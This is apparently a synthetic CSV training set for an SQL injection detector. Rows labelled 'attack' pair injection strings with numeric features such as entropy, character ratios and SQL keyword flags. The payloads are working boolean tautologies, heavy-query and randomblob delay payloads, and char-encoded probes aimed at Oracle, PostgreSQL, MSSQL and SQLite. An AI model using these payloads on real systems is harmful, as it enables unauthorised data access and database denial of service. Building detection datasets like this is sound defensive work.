id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000029,attack,boolean,"1   )    )    as rcon where 8190  =  8190 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000689,0.2353925208727509,155.40637771570897,31.513374612041574,4.045201808335845,73.0,18.0,44.91975232775055,19.486625387958426,0.4699741156385818,0.1158840285136229,0.28875928871889717,0.12538256712889814,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.4866253879584255,0.0,5.0,4.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000030,attack,boolean,"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",nearest_attack_euclidean,R001404,0.07400216729439953,73.0,24.486004924735024,3.7192523109662368,20.0,16.0,26.0,11.0,0.273972602739726,0.2191780821917808,0.3561643835616438,0.1506849315068493,4.0,0.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000031,attack,boolean,-4669  )   or 2452  =  1601#,nearest_attack_euclidean,R000356,0.3363952849297895,28.141354089620535,13.85864591037946,3.218734986860147,2.0,12.0,10.0,4.141354089620538,0.07108040864625484,0.426482451877529,0.35540204323127417,0.14703509624494207,0.0,0.1413540896205402,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.9999999999999996,0.0,0.14135408962054014,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000032,attack,boolean,1'  )   where 5280  =  5280 and 4595  =  4595#,nearest_attack_euclidean,R000617,0.8470124789337392,46.977308234412035,18.67423058852932,3.497090402566167,7.674230588529319,17.977308234412035,16.0,5.325769411470679,0.16379598101022735,0.3821392807444317,0.3408886726927273,0.11317606555261359,1.0,0.0,0.32576941147067884,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,2.325769411470679,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.674230588529321,0.32576941147067895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R001304,0.04836463841409523,90.90033032398026,28.980066064796052,3.7050320286628016,32.0,13.059801805611848,34.880396388776305,10.960132129592102,0.35205589440744084,0.1437180769357187,0.3836703948427466,0.12055563381409386,0.0,0.9800660647960511,0.0,0.0,1.0,1.0,0.0,5.980066064796051,0.0,1.0,1.0,1.9999999999999996,0.0,0.9800660647960511,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000034,attack,boolean,"1 where 1776  =  1776 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000325,0.9394287783509125,230.31912652806201,34.92273039719842,3.798489906115952,69.106375509354,34.169092158879366,90.02910590655242,37.01455295327621,0.2995212965489257,0.15014149206349553,0.3904128911518869,0.15992432023569195,0.0,0.0,2.0,0.0,0.0,2.0,0.0,19.507276476638104,0.0,1.5845460794396842,3.5845460794396846,12.338184317758738,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.169092158879369,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.16909215887937
SMOTE_000035,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000270,0.2599857176038007,222.8194015420965,29.152370542879513,3.5225863106656234,120.0,12.0,68.73362479937359,22.085776742722913,0.5403705872433627,0.05403705872433627,0.30673381582754866,0.09885853820475231,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.085776742722912,0.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000036,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000388,0.01642476406806667,69.0,24.0,3.5904493590042286,14.0,21.0,26.0,8.0,0.2028985507246377,0.30434782608695654,0.37681159420289856,0.11594202898550725,0.0,0.0,2.0,0.0,1.0,2.0,0.0,3.0,0.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,boolean,"-7743"" or 9323  =  9323#",nearest_attack_euclidean,R001497,0.030901950362097926,23.999999999999986,12.0,3.19189150573675,2.0,12.0,6.0,3.9999999999999982,0.08333333333333331,0.5,0.25,0.16666666666666666,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,1.0,0.0,1.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000038,attack,boolean,1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',nearest_attack_euclidean,R001454,0.5473403302396526,357.32545282788317,29.16627264139416,3.1674577729526825,82.33018113115327,47.0,173.9952716967299,54.0,0.23033567812750932,0.13158784039615617,0.48689045208500625,0.15118602939132836,4.0,0.0,0.0,0.0,0.0,2.0,0.0,36.33254528278832,1.6674547172116823,0.0,0.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000039,attack,boolean,"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",nearest_attack_euclidean,R001560,0.503174697727187,155.8540230218518,32.0,4.060810682994489,78.63227711460459,8.239297919509509,49.78595839019016,19.19648959754754,0.5064344493561868,0.05310354222098061,0.3174025749546962,0.1230594334681365,0.0,4.0,0.0,0.0,1.0,1.7607020804904918,0.0,6.957191678038032,0.0,0.0,2.239297919509508,2.760702080490492,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000040,attack,boolean,"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",nearest_attack_euclidean,R001270,0.14014411500991997,283.01310889940805,36.6026217798816,3.6852160574976227,86.0,29.0,120.4104871195264,47.6026217798816,0.3039516334316615,0.10249531825021144,0.42536194018888235,0.16819110812924473,0.0,4.0,0.0,0.0,0.0,1.0,0.0,26.602621779881602,0.0,1.9999999999999998,4.0,11.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000041,attack,boolean,"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",nearest_attack_euclidean,R001065,1.2674603915255775,159.70278773415,32.78131132106364,4.100351043741202,75.43737735787272,18.0,45.04672169734091,21.218688678936363,0.4724858612769639,0.11283874624522955,0.28186797923078505,0.1328074132470215,1.6093443394681817,0.0,0.7813113210636367,0.0,1.0,2.0,0.0,5.609344339468182,0.0,5.0,4.0,5.0,1.0,0.0,0.39065566053181844,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6093443394681817,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.609344339468182
SMOTE_000042,attack,boolean,-6813   )    )     )   or 6872  =  6872 and    (    (     (  7304  =  7304,nearest_attack_euclidean,R000775,0.27694942273555545,74.73451782737871,18.146903565475743,2.809502321917294,5.0,20.587614261902967,40.0,9.146903565475741,0.06693934499882082,0.2751955352092449,0.5355147599905665,0.12235035980136787,0.0,0.0,1.0,0.0,0.14690356547574202,2.0,0.0,6.0,0.0,0.0,0.0,3.146903565475742,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,boolean,-5291'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'tmpm'  =  'tmpm,nearest_attack_euclidean,R000435,0.24970712508703286,378.22267770681515,38.43522314223459,3.635267063257551,101.0,48.0,164.35223142234594,64.87044628446918,0.26726272296731063,0.1270159475488209,0.4342033592649898,0.17151797021887857,4.0,0.0,1.0,0.0,0.0,3.0,0.0,32.87044628446919,0.0,3.0,0.0,24.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000044,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000563,0.3532441173188323,123.59544105364756,30.0,3.4644706108920507,34.0,13.0,56.496200878039645,20.099240175607928,0.27713215239394484,0.10596229356239066,0.45431436020632054,0.16259119383734397,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.099240175607928,2.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000045,attack,boolean,-7293'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000339,0.2897819464476277,38.00612416087799,12.601224832175594,2.6827288741832764,2.0,12.0,18.404899328702378,5.601224832175594,0.05284839405588859,0.31709036433533166,0.4829096356646684,0.1471516059441114,1.0,0.0,1.0,0.0,0.0,1.0,0.0,2.6012248321755953,0.0,0.0,0.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000046,attack,boolean,"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000453,0.3873252018925311,112.33553249777773,33.77741125037038,3.713438981601521,32.0,15.0,47.335532497777734,18.0,0.2849975329230086,0.1335925935576603,0.4210987612501388,0.16031111226919234,2.0,1.0,2.0,1.0,0.0,1.0,0.0,9.222588749629622,0.777411250370378,0.0,1.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000047,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R001022,1.0397673901092839,24.448605223638594,10.448605223638609,2.7610551538049446,3.0,9.0,10.0,2.4486052236386087,0.12275697388180695,0.36827092164542086,0.4091899129393566,0.09978219153341561,0.448605223638608,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.44860522363860794,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000048,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bkcs'  =  'bkcs",nearest_attack_euclidean,R000375,0.7932315888178331,124.80777897986934,33.0,3.7684545028986305,39.58962802684087,17.41037197315913,50.41037197315913,17.397407006710218,0.317993163808339,0.13892727472115288,0.40346016018559555,0.1396194012849126,4.794814013420435,0.0,0.0,1.0,0.0,2.0,0.0,8.602592993289782,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000837,0.10379985614825835,126.36911517204436,29.0,3.6175964608112334,41.0,14.0,51.69529213763549,19.673823034408873,0.3245595959061345,0.11082522787038737,0.4089452673716331,0.15566990885184506,3.0,0.0,0.0,0.0,0.0,1.0,0.0,10.673823034408873,1.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000173,1.0278367623764761,150.07474954547232,34.0,4.025379432988021,58.18900020201231,15.0,53.52749949496923,23.358249848490768,0.390257078255967,0.10025329676561881,0.35438437478395873,0.15510525019445545,4.0,4.0,0.0,0.0,0.0,2.0,0.0,6.9054998989938445,1.4527499494969227,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000051,attack,boolean,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000088,0.0,63.0,23.0,3.4284551513051755,24.0,4.0,26.0,9.0,0.38095238095238093,0.06349206349206349,0.4126984126984127,0.14285714285714285,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,1.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000052,attack,boolean,select * from users where id  =  1.*1 or 1  =  1 -- 1,nearest_attack_euclidean,R000061,1.3097280621697207,55.299502156454025,20.459900431290805,3.605135742889517,24.0,5.0,17.91980086258161,8.379701293872415,0.43487701634518655,0.0905993784052472,0.32389652213959236,0.1506270831099739,1.3797012938724154,0.0,2.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,6.0,0.45990043129080493,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000053,attack,boolean,"1%""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001278,0.0019750852083967214,273.0496704382104,37.0,3.594781480263777,74.0,29.0,120.0397363505683,50.00993408764207,0.2710146958616139,0.10620846189171357,0.43962370171915116,0.1831531405275213,0.0,4.0,0.0,0.0,0.0,2.0,0.0,26.009934087642073,2.0,1.9999999999999998,4.0,12.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000054,attack,boolean,1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,nearest_attack_euclidean,R000559,0.01884408877600109,68.74685224375422,23.941581287020202,3.657464268634585,13.883162574040405,21.0,25.88316257404041,7.980527095673402,0.20172937013359968,0.3057236291100315,0.37642858676790336,0.11611841398846556,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.980527095673401,0.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",nearest_attack_euclidean,R000336,0.03271251655670786,200.60700031910685,33.939299968089315,3.891945241490884,68.0,27.0,74.48560025528548,31.12140006382137,0.3390172375785889,0.1346097855091456,0.371242905415314,0.15513007149695146,0.0,4.0,0.0,0.0,0.0,1.0,0.0,16.12140006382137,0.0,1.0,3.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000056,attack,boolean,"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",nearest_attack_euclidean,R001560,0.5009618478678154,155.8150850075055,32.0,4.060965909548431,78.6207009481773,8.238245540743392,49.76491081486783,19.191227703716958,0.5064809442033291,0.05310933948644021,0.31735296748180364,0.12305674882842702,0.0,4.0,0.0,0.0,1.0,1.7617544592566083,0.0,6.9529821629735675,0.0,0.0,2.238245540743392,2.7617544592566077,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000057,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001250,0.05570146543355916,130.68070279722238,33.73614055944447,3.7778816171673055,41.60421083916671,21.0,52.20842167833342,15.868070279722238,0.3183959898056457,0.16096491079940003,0.3991771112883675,0.12146198810658668,0.0,1.0,2.0,0.0,1.0,2.0,0.0,7.868070279722238,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000058,attack,boolean,admin'  )   or   (  '1'  =  '1'--,nearest_attack_euclidean,R000067,2.016719076163068,37.49388686081136,14.449388686081138,2.9431484428202532,4.753056569594328,6.49388686081136,16.696332116486815,9.550611313918864,0.13769813866873365,0.15878117877741518,0.4426106721583551,0.2609100103954961,3.2024452556754563,0.0,2.449388686081136,0.0,0.0,1.0,0.0,2.449388686081136,0.4493886860811359,0.0,0.0,3.449388686081136,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
